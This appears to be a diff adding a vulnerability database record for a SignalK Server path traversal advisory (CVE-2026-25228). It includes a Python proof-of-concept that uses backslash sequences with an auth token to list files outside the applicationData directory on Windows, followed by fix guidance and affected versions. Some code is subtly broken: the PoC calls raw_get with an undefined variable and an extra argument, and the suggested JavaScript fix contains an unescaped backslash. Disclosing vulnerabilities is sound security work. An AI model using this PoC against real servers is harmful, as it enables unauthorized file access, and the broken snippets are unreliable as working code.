@@ -1,0 +1,363 @@
+advisory_id: GHSA-vrhw-v2hw-jffx
+datasource_id: github_osv/GHSA-vrhw-v2hw-jffx
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/02/GHSA-vrhw-v2hw-jffx/GHSA-vrhw-v2hw-jffx.json
+aliases:
+  - CVE-2026-25228
+summary: |
+  SignalK Server has Path Traversal leading to information disclosure
+  ### Summary
+  A Path Traversal vulnerability in SignalK Server's `applicationData` API allows authenticated users on Windows systems to read, write, and list arbitrary files and directories on the filesystem. The `validateAppId()` function blocks forward slashes (`/`) but not backslashes (`\`), which are treated as directory separators by `path.join()` on Windows. This enables attackers to escape the intended `applicationData` directory.
+
+  ### Details
+  **Platform**: Windows (Linux only allows traversal up a single directory)
+  **Authentication Required**: Yes (ability to write depends on user's permission)
+
+  The vulnerability exists in the `validateAppId()` function within the applicationData API handler. This function validates the `appid` parameter but only checks for forward slashes:
+
+  ```javascript
+  // Simplified vulnerable code pattern
+  function validateAppId(appid) {
+    if (appid.includes('/') || appid.length >= 30) {
+      return false;
+    }
+    return true;
+  }
+
+  // Later used in path construction
+  const dataPath = path.join(configPath, 'applicationData', 'users', deviceId, appid);
+  ```
+
+  **Root Cause:**
+  - The validation only blocks `/` characters
+  - On Windows, `path.join()` uses the platform's native path separator
+  - Windows treats both `/` and `\` as valid directory separators
+  - Backslash-based traversal sequences like `..\..\..` pass validation
+  - When `path.join()` processes these on Windows, each `..` traverses up one directory level
+
+  ### PoC
+  ```python
+  #!/usr/bin/env python3
+
+  import argparse
+  import http.client
+  import json
+  import sys
+  from urllib.parse import urlparse
+
+  PREFIX = "/signalk/v1/applicationData"
+
+
+  def raw_get(base, path, token):
+      """
+      GET using http.client so that '..' and backslashes in the URL
+      are sent literally (requests/urllib would normalise them away).
+      """
+      parsed = urlparse(base)
+      host, port = parsed.hostname, parsed.port or 80
+      conn = http.client.HTTPConnection(host, port)
+      conn.request("GET", path, headers={"Authorization": f"Bearer {token}"})
+      resp = conn.getresponse()
+      status = resp.status
+      body = resp.read().decode("utf-8", errors="replace")
+      conn.close()
+      return status, body
+
+
+  def main():
+      ap = argparse.ArgumentParser(description="Signal K Windows path traversal PoC")
+      ap.add_argument("--target", required=True, help="e.g. http://192.168.1.100:3000")
+      ap.add_argument("--token", required=True, help="any valid JWT token")
+      args = ap.parse_args()
+
+      base = args.target.rstrip("/")
+
+      # On Windows, path.join(configPath, "applicationData", "users", id, appid)
+      # resolves each '..' upward when separated by backslashes.
+      #
+      # Depth from base (configPath/applicationData/users/):
+      #   ..              → applicationData/users/          (1 level)
+      #   ..\..           → applicationData/                (2 levels)
+      #   ..\..\..        → configPath (.signalk)           (3 levels)
+      #   ..\..\..\..     → user home directory             (4 levels)
+
+      traversals = [
+          ("..\\..\\..\\", ".signalk config directory"),
+          ("..\\..\\..\\..\\", "user home directory"),
+      ]
+
+      for appid, description in traversals:
+          path = f"{PREFIX}/user/{appid}"
+          status, body = raw_get(base, path, token, args.token)
+
+          print(f"[{status}] {description}")
+          print(f"  GET {path}")
+
+          if status == 200:
+              try:
+                  entries = json.loads(body)
+                  for entry in entries:
+                      print(f"    {entry}")
+              except json.JSONDecodeError:
+                  print(f"    {body[:200]}")
+          else:
+              print(f"    {body[:200]}")
+          print()
+
+
+  if __name__ == "__main__":
+      main()
+  ```
+
+  **Reproduction Steps:**
+
+  1. Set up SignalK Server on a Windows machine
+  2. Obtain a valid device or user authentication token
+  3. Run the PoC script:
+     ```bash
+     python3 poc_windows_appid_traversal.py --target http://[signalK server IP]:3000 --token <YOUR_TOKEN>
+     ```
+
+  ### Recommended Fix
+
+  **Short-term:**
+  1. Add backslash validation to `validateAppId()`:
+     ```javascript
+     function validateAppId(appid) {
+       if (appid.includes('/') || appid.includes('\') || appid.length >= 30) {
+         return false;
+       }
+       return true;
+     }
+     ```
+
+  2. Use `path.normalize()` and validate that resolved paths remain within the intended directory:
+     ```javascript
+     const resolvedPath = path.normalize(path.join(baseDir, appid));
+     if (!resolvedPath.startsWith(path.normalize(baseDir))) {
+       throw new Error('Invalid path');
+     }
+     ```
+impacted_packages:
+  - purl: pkg:npm/signalk-server
+    affected_versions: vers:npm/<=2.20.2
+    fixed_versions: vers:npm/2.20.3
+    affected_packages:
+      - pkg:npm/signalk-server@0.1.24
+      - pkg:npm/signalk-server@0.1.27
+      - pkg:npm/signalk-server@0.1.28
+      - pkg:npm/signalk-server@0.1.29
+      - pkg:npm/signalk-server@0.1.30
+      - pkg:npm/signalk-server@0.1.31
+      - pkg:npm/signalk-server@0.1.32
+      - pkg:npm/signalk-server@1.0.0-0
+      - pkg:npm/signalk-server@1.0.0-1
+      - pkg:npm/signalk-server@1.0.0-2
+      - pkg:npm/signalk-server@1.0.0-3
+      - pkg:npm/signalk-server@1.0.0-4
+      - pkg:npm/signalk-server@1.0.0
+      - pkg:npm/signalk-server@1.1.0
+      - pkg:npm/signalk-server@1.1.1
+      - pkg:npm/signalk-server@1.1.2
+      - pkg:npm/signalk-server@1.2.0
+      - pkg:npm/signalk-server@1.2.1
+      - pkg:npm/signalk-server@1.2.2
+      - pkg:npm/signalk-server@1.2.3
+      - pkg:npm/signalk-server@1.2.4
+      - pkg:npm/signalk-server@1.3.0
+      - pkg:npm/signalk-server@1.4.0
+      - pkg:npm/signalk-server@1.4.1
+      - pkg:npm/signalk-server@1.4.2
+      - pkg:npm/signalk-server@1.4.3
+      - pkg:npm/signalk-server@1.5.0
+      - pkg:npm/signalk-server@1.6.0
+      - pkg:npm/signalk-server@1.7.0
+      - pkg:npm/signalk-server@1.7.1
+      - pkg:npm/signalk-server@1.8.0
+      - pkg:npm/signalk-server@1.9.0
+      - pkg:npm/signalk-server@1.9.1
+      - pkg:npm/signalk-server@1.10.0
+      - pkg:npm/signalk-server@1.10.1
+      - pkg:npm/signalk-server@1.10.2
+      - pkg:npm/signalk-server@1.11.0
+      - pkg:npm/signalk-server@1.12.0
+      - pkg:npm/signalk-server@1.13.0
+      - pkg:npm/signalk-server@1.13.1
+      - pkg:npm/signalk-server@1.14.0
+      - pkg:npm/signalk-server@1.15.0
+      - pkg:npm/signalk-server@1.16.0
+      - pkg:npm/signalk-server@1.17.0
+      - pkg:npm/signalk-server@1.18.0-beta.1
+      - pkg:npm/signalk-server@1.18.0-beta.2
+      - pkg:npm/signalk-server@1.18.0-beta.3
+      - pkg:npm/signalk-server@1.18.0-beta.4
+      - pkg:npm/signalk-server@1.18.0-beta.5
+      - pkg:npm/signalk-server@1.18.0-beta.6
+      - pkg:npm/signalk-server@1.18.0
+      - pkg:npm/signalk-server@1.19.0-beta.1
+      - pkg:npm/signalk-server@1.19.0-beta.2
+      - pkg:npm/signalk-server@1.19.0
+      - pkg:npm/signalk-server@1.20.0
+      - pkg:npm/signalk-server@1.21.0
+      - pkg:npm/signalk-server@1.22.0
+      - pkg:npm/signalk-server@1.23.0
+      - pkg:npm/signalk-server@1.24.0
+      - pkg:npm/signalk-server@1.25.0
+      - pkg:npm/signalk-server@1.26.0
+      - pkg:npm/signalk-server@1.27.0
+      - pkg:npm/signalk-server@1.27.1
+      - pkg:npm/signalk-server@1.28.0-beta.1
+      - pkg:npm/signalk-server@1.28.0
+      - pkg:npm/signalk-server@1.29.0-beta.1
+      - pkg:npm/signalk-server@1.29.0
+      - pkg:npm/signalk-server@1.30.0
+      - pkg:npm/signalk-server@1.31.0
+      - pkg:npm/signalk-server@1.32.0
+      - pkg:npm/signalk-server@1.33.0-beta.1
+      - pkg:npm/signalk-server@1.33.0
+      - pkg:npm/signalk-server@1.34.0
+      - pkg:npm/signalk-server@1.35.0
+      - pkg:npm/signalk-server@1.35.1
+      - pkg:npm/signalk-server@1.35.2
+      - pkg:npm/signalk-server@1.36.0-beta.1
+      - pkg:npm/signalk-server@1.36.0-beta.2
+      - pkg:npm/signalk-server@1.36.0-beta.3
+      - pkg:npm/signalk-server@1.36.0
+      - pkg:npm/signalk-server@1.37.0-beta.1
+      - pkg:npm/signalk-server@1.37.0-beta.3
+      - pkg:npm/signalk-server@1.37.0
+      - pkg:npm/signalk-server@1.37.1
+      - pkg:npm/signalk-server@1.37.2
+      - pkg:npm/signalk-server@1.37.3
+      - pkg:npm/signalk-server@1.37.4
+      - pkg:npm/signalk-server@1.37.5
+      - pkg:npm/signalk-server@1.37.6
+      - pkg:npm/signalk-server@1.38.0
+      - pkg:npm/signalk-server@1.38.1
+      - pkg:npm/signalk-server@1.39.0
+      - pkg:npm/signalk-server@1.40.0
+      - pkg:npm/signalk-server@1.41.0-beta.2
+      - pkg:npm/signalk-server@1.41.0-beta.3
+      - pkg:npm/signalk-server@1.41.0-beta.4
+      - pkg:npm/signalk-server@1.41.0
+      - pkg:npm/signalk-server@1.41.1
+      - pkg:npm/signalk-server@1.41.2
+      - pkg:npm/signalk-server@1.41.3
+      - pkg:npm/signalk-server@1.42.0
+      - pkg:npm/signalk-server@1.43.0
+      - pkg:npm/signalk-server@1.44.0
+      - pkg:npm/signalk-server@1.45.0
+      - pkg:npm/signalk-server@1.46.2
+      - pkg:npm/signalk-server@1.46.3
+      - pkg:npm/signalk-server@2.0.0-beta.1
+      - pkg:npm/signalk-server@2.0.0-beta.2
+      - pkg:npm/signalk-server@2.0.0-beta.5
+      - pkg:npm/signalk-server@2.0.0-beta.6
+      - pkg:npm/signalk-server@2.0.0-beta.7
+      - pkg:npm/signalk-server@2.0.0-beta.9
+      - pkg:npm/signalk-server@2.0.0-beta.11
+      - pkg:npm/signalk-server@2.0.0-beta.12
+      - pkg:npm/signalk-server@2.0.0
+      - pkg:npm/signalk-server@2.1.0
+      - pkg:npm/signalk-server@2.1.1
+      - pkg:npm/signalk-server@2.2.0
+      - pkg:npm/signalk-server@2.3.0-beta.2
+      - pkg:npm/signalk-server@2.3.0-canboatv2.1
+      - pkg:npm/signalk-server@2.3.0
+      - pkg:npm/signalk-server@2.3.1
+      - pkg:npm/signalk-server@2.4.0
+      - pkg:npm/signalk-server@2.4.1
+      - pkg:npm/signalk-server@2.5.0
+      - pkg:npm/signalk-server@2.6.0
+      - pkg:npm/signalk-server@2.6.1
+      - pkg:npm/signalk-server@2.6.2
+      - pkg:npm/signalk-server@2.7.0
+      - pkg:npm/signalk-server@2.7.1
+      - pkg:npm/signalk-server@2.7.2
+      - pkg:npm/signalk-server@2.8.0
+      - pkg:npm/signalk-server@2.8.1
+      - pkg:npm/signalk-server@2.8.2
+      - pkg:npm/signalk-server@2.8.3
+      - pkg:npm/signalk-server@2.9.0
+      - pkg:npm/signalk-server@2.10.0
+      - pkg:npm/signalk-server@2.11.0
+      - pkg:npm/signalk-server@2.12.0
+      - pkg:npm/signalk-server@2.13.0-beta.1
+      - pkg:npm/signalk-server@2.13.0-beta.2
+      - pkg:npm/signalk-server@2.13.0-beta.3
+      - pkg:npm/signalk-server@2.13.0
+      - pkg:npm/signalk-server@2.13.1
+      - pkg:npm/signalk-server@2.13.2
+      - pkg:npm/signalk-server@2.13.3
+      - pkg:npm/signalk-server@2.13.4
+      - pkg:npm/signalk-server@2.13.5
+      - pkg:npm/signalk-server@2.14.0-beta.1
+      - pkg:npm/signalk-server@2.14.0
+      - pkg:npm/signalk-server@2.14.1
+      - pkg:npm/signalk-server@2.14.2
+      - pkg:npm/signalk-server@2.14.3
+      - pkg:npm/signalk-server@2.14.4
+      - pkg:npm/signalk-server@2.15.0-beta.1
+      - pkg:npm/signalk-server@2.15.0-beta.2
+      - pkg:npm/signalk-server@2.15.0-beta.3
+      - pkg:npm/signalk-server@2.15.0-beta.4
+      - pkg:npm/signalk-server@2.15.0-beta.5
+      - pkg:npm/signalk-server@2.15.0-beta.6
+      - pkg:npm/signalk-server@2.15.0
+      - pkg:npm/signalk-server@2.15.1
+      - pkg:npm/signalk-server@2.15.2
+      - pkg:npm/signalk-server@2.15.3
+      - pkg:npm/signalk-server@2.16.0
+      - pkg:npm/signalk-server@2.17.0
+      - pkg:npm/signalk-server@2.17.2
+      - pkg:npm/signalk-server@2.18.0
+      - pkg:npm/signalk-server@2.19.0-beta.1
+      - pkg:npm/signalk-server@2.19.0-beta.2
+      - pkg:npm/signalk-server@2.19.0-beta.4
+      - pkg:npm/signalk-server@2.19.0-beta.5
+      - pkg:npm/signalk-server@2.19.0
+      - pkg:npm/signalk-server@2.19.1
+      - pkg:npm/signalk-server@2.20.0-beta.1
+      - pkg:npm/signalk-server@2.20.0
+      - pkg:npm/signalk-server@2.20.1
+      - pkg:npm/signalk-server@2.20.2
+    fixed_packages:
+      - pkg:npm/signalk-server@2.20.3
+    fixed_in_commits: []
+    introduced_in_commits: []
+  - purl: pkg:github/signalk/signalk-server
+    affected_versions:
+    fixed_versions:
+    affected_packages: []
+    fixed_packages: []
+    fixed_in_commits:
+      - vcs_url: https://github.com/signalk/signalk-server
+        commit: 9bcf61c8fe2cb8a40998b913a02fb64dff9e86c7
+        patch_text:
+    introduced_in_commits: []
+severities:
+  - score: '5.0'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:N/A:N
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/02/GHSA-vrhw-v2hw-jffx/GHSA-vrhw-v2hw-jffx.json
+  - score: MODERATE
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-22
+references:
+  - url: https://github.com/SignalK/signalk-server
+    reference_type:
+    reference_id:
+  - url: https://github.com/SignalK/signalk-server/commit/9bcf61c8fe2cb8a40998b913a02fb64dff9e86c7
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2026-25228
+    reference_type:
+    reference_id: CVE-2026-25228
+  - url: https://github.com/SignalK/signalk-server/security/advisories/GHSA-vrhw-v2hw-jffx
+    reference_type:
+    reference_id: GHSA-vrhw-v2hw-jffx
+exploits: []
